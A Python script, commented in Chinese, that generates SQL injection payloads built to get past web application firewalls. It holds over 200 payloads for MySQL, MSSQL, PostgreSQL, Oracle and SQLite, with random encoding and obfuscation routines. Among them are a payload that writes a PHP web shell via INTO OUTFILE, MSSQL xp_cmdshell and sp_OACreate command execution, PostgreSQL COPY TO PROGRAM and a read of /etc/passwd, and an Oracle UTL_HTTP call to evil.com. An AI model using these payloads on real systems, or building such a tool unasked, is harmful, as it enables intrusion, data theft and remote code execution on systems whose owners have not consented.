#!/usr/bin/env python3
"""
SQL 注入 WAF 绕过 Payload 生成器
内置 200+ 绕过 payload，支持多种注入类型（union/boolean/time/error）、
多种 DBMS（MySQL/MSSQL/PostgreSQL/Oracle/SQLite）、多种编码和混淆方式。
"""

import argparse
import base64
import json
import os
import random
import string
import sys
import signal


# ============================================================
# SQL 注入绕过 Payload 数据库
# ============================================================

# 注释绕过
COMMENT_BYPASS = [
    ("/**/代替空格", "/**/UNION/**/SELECT/**/"),
    ("注释绕过", "UNION/**/SELECT/**/1,2,3"),
    ("内联注释", "/*!UNION*/ /*!SELECT*/ 1,2,3"),
    ("MySQL版本注释", "/*!50000UNION*/ /*!50000SELECT*/ 1,2,3"),
    ("行注释", "UNION SELECT 1,2,3-- -"),
    ("行注释(#)", "UNION SELECT 1,2,3#"),
    ("块注释", "UNION SELECT 1,2,3/*comment*/"),
    ("嵌套注释", "UN/*comment*/ION SE/*comment*/LECT 1,2,3"),
    ("反引号注释绕过", "UNION SELECT `version`()"),
    ("注释+换行", "UNION%0aSELECT%0a1,2,3"),
]

# 大小写混合绕过
CASE_MIX_BYPASS = [
    ("大小写混合", "UnIoN SeLeCt 1,2,3"),
    ("全大写", "UNION SELECT 1,2,3"),
    ("随机大小写", "UnIoN sElEcT 1,2,3"),
    ("交替大小写", "uNiOn SeLeCt 1,2,3"),
    ("混合大小写2", "UnIoN AlL SeLeCt 1,2,3"),
    ("混合大小写3", "uNiOn aLl sElEcT 1,2,3"),
    ("混合大小写4", "-1' UnIoN SeLeCt 1,2,3--"),
    ("混合大小写5", "1' UnIoN aLl SeLeCt 1,2,3,4,5--"),
]

# 空格绕过
SPACE_BYPASS = [
    ("加号绕过", "UNION+SELECT+1,2,3"),
    ("Tab绕过", "UNION%09SELECT%091,2,3"),
    ("换行绕过", "UNION%0aSELECT%0a1,2,3"),
    ("回车绕过", "UNION%0dSELECT%0d1,2,3"),
    ("垂直制表符", "UNION%0bSELECT%0b1,2,3"),
    ("换页符", "UNION%0cSELECT%0c1,2,3"),
    ("注释绕过空格", "UNION/**/SELECT/**/1,2,3"),
    ("括号绕过空格", "UNION(SELECT(1),(2),(3))"),
    ("多空格", "UNION     SELECT     1,2,3"),
    ("%20绕过", "UNION%20SELECT%201,2,3"),
    ("%a0绕过", "UNION%a0SELECT%a01,2,3"),
]

# 关键字绕过
KEYWORD_BYPASS = [
    ("双写绕过", "UNUNIONION SESELECTLECT 1,2,3"),
    ("双写绕过2", "UNUNIONION%20SESELECTLECT%201,2,3"),
    ("注释分割", "UN/**/ION SE/**/LECT 1,2,3"),
    ("内联注释", "/*!50000UNION*/ /*!50000SELECT*/ 1,2,3"),
    ("反引号绕过", "UNION SELECT `user`(),`version`(),`database`()"),
    ("变量绕过", "SET @a=0x554E494F4E2053454C45435420312C322C33; PREPARE s FROM @a; EXECUTE s;"),
    ("concat绕过", "UNION SELECT concat(0x757365722829),2,3"),
    ("char绕过", "UNION SELECT char(117,115,101,114,40,41),2,3"),
]

# 编码绕过
ENCODING_BYPASS = [
    ("URL编码", "UNION%20SELECT%201,2,3"),
    ("双重URL编码", "%2555%254E%2549%254F%254E%2553%2545%254C%2545%2543%2554"),
    ("Hex编码", "0x554E494F4E2053454C45435420312C322C33"),
    ("Unicode编码", "%u0055%u004E%u0049%u004F%u004E%u0053%u0045%u004C%u0045%u0043%u0054"),
    ("HTML实体编码", "&#85;&#78;&#73;&#79;&#78; &#83;&#69;&#76;&#69;&#67;&#84; 1,2,3"),
    ("Base64编码", "UNION SELECT 1,2,3"),  # base64 形式后续编码
    ("char()编码", "UNION SELECT char(49),char(50),char(51)"),
    ("0x编码", "UNION SELECT 0x31,0x32,0x33"),
]

# UNION 注入绕过
UNION_BYPASS = [
    ("基本UNION", "UNION SELECT 1,2,3"),
    ("UNION ALL", "UNION ALL SELECT 1,2,3"),
    ("UNION DISTINCT", "UNION DISTINCT SELECT 1,2,3"),
    ("大小写混合UNION", "UnIoN SeLeCt 1,2,3"),
    ("注释UNION", "/**/UNION/**/SELECT/**/1,2,3"),
    ("内联UNION", "/*!UNION*/ /*!SELECT*/ 1,2,3"),
    ("空格绕过UNION", "UNION%0aSELECT%0a1,2,3"),
    ("双写UNION", "UNUNIONION SESELECTLECT 1,2,3"),
    ("括号UNION", "UNION(SELECT 1,2,3)"),
    ("负数UNION", "-1 UNION SELECT 1,2,3"),
    ("NULL+UNION", "NULL UNION SELECT 1,2,3"),
    ("引号+UNION", "' UNION SELECT 1,2,3--"),
    ("双引号+UNION", "\" UNION SELECT 1,2,3--"),
    ("括号+UNION", ") UNION SELECT 1,2,3--"),
    ("多列UNION", "UNION SELECT 1,2,3,4,5,6,7,8,9,10--"),
    ("UNION+注释行", "UNION SELECT 1,2,3-- -"),
    ("UNION+#注释", "UNION SELECT 1,2,3#"),
    ("UNION+块注释", "UNION SELECT 1,2,3/*"),
    ("UNION+版本注释", "/*!50000UNION*/ /*!50000SELECT*/ 1,2,3"),
    ("UNION+Tab", "UNION%09SELECT%091,2,3"),
    ("UNION+垂直制表符", "UNION%0bSELECT%0b1,2,3"),
    ("UNION+换页", "UNION%0cSELECT%0c1,2,3"),
    ("UNION+%a0", "UNION%a0SELECT%a01,2,3"),
    ("UNION concat", "UNION SELECT concat(user(),0x3a,version()),2,3"),
    ("UNION group_concat", "UNION SELECT group_concat(table_name),2,3 FROM information_schema.tables"),
    ("UNION into outfile", "' UNION SELECT 1,'<?php system($_GET[\"cmd\"]);?>',3 INTO OUTFILE '/tmp/shell.php'--"),
    ("UNION hex", "UNION SELECT hex(user()),2,3"),
    ("UNION unhex", "UNION SELECT unhex(hex(user())),2,3"),
    ("UNION IFNULL", "UNION SELECT IFNULL(user(),'null'),2,3"),
]

# 布尔盲注绕过
BOOLEAN_BYPASS = [
    ("基本布尔", "' OR '1'='1"),
    ("双引号布尔", "\" OR \"1\"=\"1"),
    ("数字布尔", "1 OR 1=1"),
    ("注释布尔", "' OR '1'='1' --"),
    ("#注释布尔", "' OR '1'='1'#"),
    ("大小写布尔", "' oR '1'='1"),
    ("空格绕过布尔", "'%09OR%09'1'='1"),
    ("注释绕过布尔", "'/**/OR/**/'1'='1"),
    ("双写布尔", "' OORR '1'='1"),
    ("等号绕过", "' OR 1 LIKE 1"),
    ("等号绕过2", "' OR 1 IN (1)"),
    ("不等号绕过", "' OR 1<>0"),
    ("BETWEEN绕过", "' OR 1 BETWEEN 0 AND 2"),
    ("IS绕过", "' OR 1 IS NOT NULL"),
    ("REGEXP绕过", "' OR 1 REGEXP 1"),
    ("比较绕过", "' OR 1=1-- -"),
    ("IF绕过", "' OR IF(1=1,1,0)--"),
    ("CASE绕过", "' OR CASE WHEN 1=1 THEN 1 ELSE 0 END--"),
    ("多个OR", "' OR 1=1 OR 1=1 OR 1=1--"),
    ("AND+OR", "' AND 1=0 OR 1=1--"),
    ("NOT绕过", "' OR NOT 1=0--"),
    ("XOR绕过", "' OR 1 XOR 0--"),
    ("位运算绕过", "' OR 1&1--"),
    ("反引号布尔", "` OR `1`=`1"),
    ("转义布尔", "\\' OR \\'1\\'=\\'1"),
    ("UNICODE布尔", "' OR '1'='1'/*"),
    ("编码布尔", "%27%20OR%20%271%27%3D%271"),
    ("双重编码布尔", "%2527%2520OR%2520%25271%2527%253D%25271"),
    ("引号嵌套布尔", "'' OR ''1''=''1"),
    ("括号布尔", "' OR ('1'='1"),
]

# 时间盲注绕过
TIME_BYPASS = [
    ("SLEEP注入", "' AND SLEEP(5)--"),
    ("SLEEP大小写", "' AND sLeEp(5)--"),
    ("SLEEP空格绕过", "'%09AND%09SLEEP(5)--"),
    ("SLEEP注释绕过", "'/**/AND/**/SLEEP(5)--"),
    ("BENCHMARK注入", "' AND BENCHMARK(5000000,MD5('test'))--"),
    ("BENCHMARK大小写", "' AND bEnChMaRk(5000000,MD5('test'))--"),
    ("PG_SLEEP", "'; SELECT PG_SLEEP(5)--"),
    ("WAITFOR DELAY", "'; WAITFOR DELAY '0:0:5'--"),
    ("GET_LOCK", "' AND GET_LOCK('test',5)--"),
    ("复杂SLEEP", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"),
    ("IF+SLEEP", "' AND IF(1=1,SLEEP(5),0)--"),
    ("CASE+SLEEP", "' AND CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END--"),
    ("RLIKE+SLEEP", "' AND '1' RLIKE SLEEP(5)--"),
    ("双重SLEEP", "' AND SLEEP(5) AND SLEEP(5)--"),
    ("子查询SLEEP", "' AND (SELECT SLEEP(5))--"),
    ("HEAVY注入", "' AND (SELECT COUNT(*) FROM information_schema.tables a, information_schema.tables b)--"),
]

# 错误注入绕过
ERROR_BYPASS = [
    ("extractvalue", "' AND extractvalue(1,concat(0x7e,(SELECT user())))--"),
    ("updatexml", "' AND updatexml(1,concat(0x7e,(SELECT user())),1)--"),
    ("floor报错", "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"),
    ("exp报错", "' AND exp(~(SELECT * FROM (SELECT user())a))--"),
    ("NAME_CONST", "' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))a)--"),
    ("JSON报错", "' AND (SELECT extractvalue(1,concat(0x7e,(SELECT user()))))--"),
    ("大小写extractvalue", "' AND eXtRaCtVaLuE(1,concat(0x7e,(SELECT user())))--"),
    ("大小写updatexml", "' AND uPdAtExMl(1,concat(0x7e,(SELECT user())),1)--"),
    ("注释extractvalue", "'/**/AND/**/extractvalue(1,concat(0x7e,(SELECT user())))--"),
    ("空格extractvalue", "'%09AND%09extractvalue(1,concat(0x7e,(SELECT user())))--"),
]

# MSSQL 特有绕过
MSSQL_BYPASS = [
    ("MSSQL UNION", "UNION SELECT 1,2,3--"),
    ("MSSQL WAITFOR", "; WAITFOR DELAY '0:0:5'--"),
    ("MSSQL xp_cmdshell", "; EXEC xp_cmdshell('whoami')--"),
    ("MSSQL sp_executesql", "; EXEC sp_executesql N'SELECT @@version'--"),
    ("MSSQL 注释", "UNION/**/SELECT/**/1,@@version,3--"),
    ("MSSQL HEX", "DECLARE @a VARCHAR(100); SET @a=0x554E494F4E2053454C45435420312C322C33; EXEC(@a)--"),
    ("MSSQL CHAR", "; EXEC('BEGIN ' + CHAR(85) + CHAR(78) + CHAR(73) + CHAR(79) + CHAR(78) + ' SELECT 1,2,3')--"),
    ("MSSQL 大小写", "UnIoN SeLeCt 1,@@version,3--"),
    ("MSSQL CONVERT", "UNION SELECT CONVERT(int,@@version),2,3--"),
    ("MSSQL CAST", "UNION SELECT CAST(@@version AS int),2,3--"),
    ("MSSQL CONCAT", "UNION SELECT CONCAT(1,2,3),2,3--"),
    ("MSSQL STACKED", "1; SELECT @@version--"),
    ("MSSQL 嵌套", "1;EXEC('SELECT @@version')--"),
    ("MSSQL 绕过EXEC", "; E/**/X/**/E/**/C xp_cmdshell('whoami')--"),
    ("MSSQL sp_OACreate", "; DECLARE @shell INT; EXEC sp_OACreate 'wscript.shell',@shell OUT; EXEC sp_OAMethod @shell,'run',null,'cmd /c whoami'--"),
]

# PostgreSQL 特有绕过
POSTGRESQL_BYPASS = [
    ("PG UNION", "UNION SELECT 1,2,3--"),
    ("PG $$引号", "UNION SELECT current_user,2,3--"),
    ("PG dollar-quoting", "UNION SELECT $$current_user$$,2,3--"),
    ("PG 版本", "UNION SELECT version(),2,3--"),
    ("PG COPY", "; COPY (SELECT '') TO PROGRAM('id')--"),
    ("PG lo_import", "; SELECT lo_import('/etc/passwd')--"),
    ("PG PG_SLEEP", "; SELECT PG_SLEEP(5)--"),
    ("PG generate_series", "UNION SELECT string_agg(usename,','),2,3 FROM pg_user--"),
    ("PG 大小写", "UnIoN SeLeCt version(),2,3--"),
    ("PG 注释", "/**/UNION/**/SELECT/**/version(),2,3--"),
    ("PG 空格", "UNION%09SELECT%09version(),2,3--"),
    ("PG chr", "UNION SELECT chr(97)||chr(98)||chr(99),2,3--"),
    ("PG CAST", "UNION SELECT CAST(version() AS int),2,3--"),
]

# SQLite 特有绕过
SQLITE_BYPASS = [
    ("SQLite UNION", "UNION SELECT 1,2,3--"),
    ("SQLite 版本", "UNION SELECT sqlite_version(),2,3--"),
    ("SQLite CHAR", "UNION SELECT CHAR(97,98,99),2,3--"),
    ("SQLite group_concat", "UNION SELECT group_concat(name),2,3 FROM sqlite_master--"),
    ("SQLite 大小写", "UnIoN SeLeCt sqlite_version(),2,3--"),
    ("SQLite 注释", "/**/UNION/**/SELECT/**/sqlite_version(),2,3--"),
    ("SQLite 空格", "UNION%09SELECT%09sqlite_version(),2,3--"),
    ("SQLite typeof", "UNION SELECT typeof(1),2,3--"),
    ("SQLite quote", "UNION SELECT quote(sql),2,3 FROM sqlite_master--"),
    ("SQLite hex", "UNION SELECT hex(name),2,3 FROM sqlite_master--"),
]

# Oracle 特有绕过
ORACLE_BYPASS = [
    ("Oracle UNION", "UNION SELECT 1,2,3 FROM dual--"),
    ("Oracle 版本", "UNION SELECT banner,2,3 FROM v$version--"),
    ("Oracle 用户", "UNION SELECT user,2,3 FROM dual--"),
    ("Oracle CHR", "UNION SELECT CHR(97)||CHR(98)||CHR(99),2,3 FROM dual--"),
    ("Oracle 大小写", "UnIoN SeLeCt user,2,3 FROM dual--"),
    ("Oracle 注释", "/**/UNION/**/SELECT/**/user,2,3 FROM dual--"),
    ("Oracle 空格", "UNION%09SELECT%09user,2,3%09FROM%09dual--"),
    ("Oracle DBMS_PIPE", "UNION SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5),2,3 FROM dual--"),
    ("Oracle UTL_HTTP", "UNION SELECT UTL_HTTP.REQUEST('http://evil.com'),2,3 FROM dual--"),
    ("Oracle DECODE", "UNION SELECT DECODE(user,'SYS',1,0),2,3 FROM dual--"),
]

# 额外绕过技巧 (25+)
EXTRA_BYPASS = [
    ("HAVING绕过", "' HAVING 1=1--"),
    ("GROUP BY绕过", "' GROUP BY table.column HAVING 1=1--"),
    ("ORDER BY绕过", "1' ORDER BY 1--"),
    ("ORDER BY列数", "1' ORDER BY 10--"),
    ("LIKE绕过", "' OR 1 LIKE 1--"),
    ("IN绕过", "' OR 1 IN (SELECT 1)--"),
    ("EXISTS绕过", "' OR EXISTS(SELECT 1)--"),
    ("BETWEEN绕过", "' OR 1 BETWEEN 0 AND 1--"),
    ("子查询绕过", "' OR (SELECT 1)=1--"),
    ("数字绕过引号", "1 OR 1=1"),
    ("负数绕过", "-1 OR 1=1"),
    ("浮点绕过", "1.0 OR 1=1"),
    ("科学计数绕过", "1e0 OR 1=1"),
    ("空格+换行绕过", "UNION%0a%0dSELECT 1,2,3--"),
    ("多重注释", "/****/UNION/****/SELECT 1,2,3--"),
    ("括号嵌套", "((UNION)) ((SELECT)) 1,2,3--"),
    ("Unicode空格", "UNION%C0%A0SELECT 1,2,3--"),
    ("全角空格", "UNION%E3%80%80SELECT 1,2,3--"),
    ("垂直制表绕过", "UNION%0BSELECT 1,2,3--"),
    ("混合编码绕过", "%55NION %53ELECT 1,2,3--"),
    ("关键字分割+注释", "UN%00ION SE%00LECT 1,2,3--"),
    ("多重URL编码", "%2555NION %2553ELECT 1,2,3--"),
    ("JSON注入", '{\"id\": \"1 OR 1=1\"}'),
    ("XML注入", '<id>1 OR 1=1</id>'),
    ("编码绕过AND", "%26%26 1=1"),
    ("编码绕过OR", "%7C%7C 1=1"),
]


# ============================================================
# 编码函数
# ============================================================

def url_encode(s):
    """URL 编码。"""
    return "".join(f"%{ord(c):02X}" for c in s)


def url_double_encode(s):
    """双重 URL 编码。"""
    return "".join(f"%25{ord(c):02X}" for c in s)


def hex_encode(s):
    """Hex 编码。"""
    return "0x" + s.encode().hex()


def char_encode(s):
    """CHAR() 编码（MySQL）。"""
    return f"CHAR({','.join(str(ord(c)) for c in s)})"


def base64_encode(s):
    """Base64 编码。"""
    return base64.b64encode(s.encode()).decode()


def encode_payload(payload, encode_type):
    """根据编码类型对 payload 进行编码。"""
    if encode_type == "none":
        return payload
    elif encode_type == "hex":
        return hex_encode(payload)
    elif encode_type == "base64":
        return base64_encode(payload)
    elif encode_type == "char":
        return char_encode(payload)
    elif encode_type == "url_double":
        return url_double_encode(payload)
    elif encode_type == "all":
        # 随机选择一种编码
        encoders = [url_encode, hex_encode, base64_encode, char_encode, url_double_encode]
        return random.choice(encoders)(payload)
    return payload


# ============================================================
# 混淆函数
# ============================================================

def obfuscate_comment(payload):
    """注释混淆：在关键字之间插入注释。"""
    keywords = ["UNION", "SELECT", "AND", "OR", "FROM", "WHERE"]
    result = payload
    for kw in keywords:
        mid = len(kw) // 2
        result = result.replace(kw, kw[:mid] + "/**/" + kw[mid:])
        result = result.replace(kw.lower(), kw[:mid].lower() + "/**/" + kw[mid:].lower())
    return result


def obfuscate_case(payload):
    """大小写混淆：随机混合大小写。"""
    result = []
    for i, c in enumerate(payload):
        if c.isalpha():
            if i % 2 == 0:
                result.append(c.upper())
            else:
                result.append(c.lower())
        else:
            result.append(c)
    return "".join(result)


def obfuscate_space(payload):
    """空格混淆：用各种字符替换空格。"""
    replacements = ["/**/", "%09", "%0a", "%0b", "%0c", "%a0", "+"]
    result = payload
    for i in range(len(payload)):
        if result[i] == " ":
            result = result[:i] + random.choice(replacements) + result[i + 1:]
    return result


def obfuscate_keyword(payload):
    """关键字混淆：分割关键字。"""
    keywords = ["UNION", "SELECT"]
    result = payload
    for kw in keywords:
        if kw in result.upper():
            mid = len(kw) // 2
            # 使用内联注释分割
            result = result.replace(kw, f"{kw[:mid]}/**/{kw[mid:]}")
    return result


def apply_obfuscation(payload, obfuscate_type):
    """应用混淆。"""
    if obfuscate_type == "none":
        return payload
    elif obfuscate_type == "comment":
        return obfuscate_comment(payload)
    elif obfuscate_type == "case":
        return obfuscate_case(payload)
    elif obfuscate_type == "space":
        return obfuscate_space(payload)
    elif obfuscate_type == "keyword":
        return obfuscate_keyword(payload)
    elif obfuscate_type == "all":
        # 随机应用多种混淆
        obfuscators = [obfuscate_comment, obfuscate_case, obfuscate_space, obfuscate_keyword]
        for obf in random.sample(obfuscators, min(2, len(obfuscators))):
            payload = obf(payload)
        return payload
    return payload


# ============================================================
# Payload 生成函数
# ============================================================

def generate_payloads(injection_type, dbms, encode, obfuscate, count):
    """生成绕过 payload 列表。"""
    # 收集所有 payload
    all_payloads = []

    # 根据注入类型选择 payload
    type_map = {
        "union": UNION_BYPASS + COMMENT_BYPASS + CASE_MIX_BYPASS + SPACE_BYPASS + KEYWORD_BYPASS + EXTRA_BYPASS,
        "boolean": BOOLEAN_BYPASS + COMMENT_BYPASS + CASE_MIX_BYPASS + EXTRA_BYPASS,
        "time": TIME_BYPASS + COMMENT_BYPASS + CASE_MIX_BYPASS,
        "error": ERROR_BYPASS + COMMENT_BYPASS + CASE_MIX_BYPASS,
    }

    # 根据 DBMS 选择特有 payload
    dbms_map = {
        "mysql": [],
        "mssql": MSSQL_BYPASS,
        "postgresql": POSTGRESQL_BYPASS,
        "oracle": ORACLE_BYPASS,
        "sqlite": SQLITE_BYPASS,
    }

    if injection_type == "all":
        for key, payloads in type_map.items():
            for method, payload in payloads:
                all_payloads.append({
                    "type": key,
                    "original": payload,
                    "bypass_method": method,
                })
        # 添加 DBMS 特有 payload
        for method, payload in dbms_map.get(dbms, []):
            all_payloads.append({
                "type": "dbms_specific",
                "original": payload,
                "bypass_method": method,
            })
        # 如果选择 all，也添加其他 DBMS 的 payload
        for d, payloads in dbms_map.items():
            if d != dbms:
                for method, payload in payloads:
                    all_payloads.append({
                        "type": "dbms_specific",
                        "original": payload,
                        "bypass_method": f"{d}: {method}",
                    })
    else:
        for method, payload in type_map.get(injection_type, []):
            all_payloads.append({
                "type": injection_type,
                "original": payload,
                "bypass_method": method,
            })
        # 添加 DBMS 特有 payload
        for method, payload in dbms_map.get(dbms, []):
            all_payloads.append({
                "type": injection_type,
                "original": payload,
                "bypass_method": method,
            })

    # 应用编码和混淆
    result_payloads = []
    for i, p in enumerate(all_payloads):
        original = p["original"]
        # 应用混淆
        if obfuscate != "none":
            obfuscated = apply_obfuscation(original, obfuscate)
        else:
            obfuscated = original
        # 应用编码
        if encode != "none":
            encoded_payload = encode_payload(obfuscated, encode)
            is_encoded = True
        else:
            encoded_payload = obfuscated
            is_encoded = False

        result_payloads.append({
            "id": i + 1,
            "type": p["type"],
            "original": original,
            "bypass_method": p["bypass_method"],
            "payload": encoded_payload,
            "encoded": is_encoded,
            "dbms": dbms,
        })

    # 限制数量
    if count > 0:
        result_payloads = result_payloads[:count]

    return result_payloads


# ============================================================
# 主函数
# ============================================================


_timeout_value = 300

def _timeout_handler(signum, frame):
    """超时信号处理器"""
    print(json.dumps({"status": "timeout", "error": f"操作超时({_timeout_value}秒)", "timeout": _timeout_value}, ensure_ascii=False))
    sys.exit(1)


def main():
    parser = argparse.ArgumentParser(
        description="SQL 注入 WAF 绕过 Payload 生成器"
    )
    parser.add_argument(
        "--type", default="all",
        help="注入类型：union/boolean/time/error/all（默认 all）"
    )
    parser.add_argument(
        "--dbms", default="mysql",
        help="目标数据库：mysql/mssql/postgresql/oracle/sqlite（默认 mysql）"
    )
    parser.add_argument(
        "--encode", default="none",
        help="编码方式：none/hex/base64/char/url_double/all（默认 none）"
    )
    parser.add_argument(
        "--obfuscate", default="none",
        help="混淆方式：none/comment/case/space/keyword/all（默认 none）"
    )
    parser.add_argument("--count", type=int, default=20, help="生成数量（默认 20）")
    parser.add_argument("--output", "-o", help="结果保存文件路径（可选）")
    parser.add_argument("--timeout", type=int, default=300, help="操作超时时间(秒)")
    args = parser.parse_args()

    global _timeout_value
    _timeout_value = args.timeout
    signal.signal(signal.SIGALRM, _timeout_handler)
    signal.alarm(args.timeout)

    try:
        payloads = generate_payloads(
            args.type, args.dbms, args.encode, args.obfuscate, args.count
        )

        result = {
            "dbms": args.dbms,
            "injection_type": args.type,
            "encode": args.encode,
            "obfuscate": args.obfuscate,
            "total_payloads": len(payloads),
            "payloads": payloads,
        }

        json_output = json.dumps(result, ensure_ascii=False, indent=2)

        if args.output:
            try:
                with open(args.output, "w", encoding="utf-8") as f:
                    f.write(json_output)
                print(f"结果已保存到: {args.output}")
            except IOError as e:
                print(json.dumps({"error": f"写入文件失败: {e}"}), file=sys.stderr)
                print(json_output)
        else:
            print(json_output)

    except Exception as e:
        print(json.dumps({"error": f"生成失败: {e}"}), file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
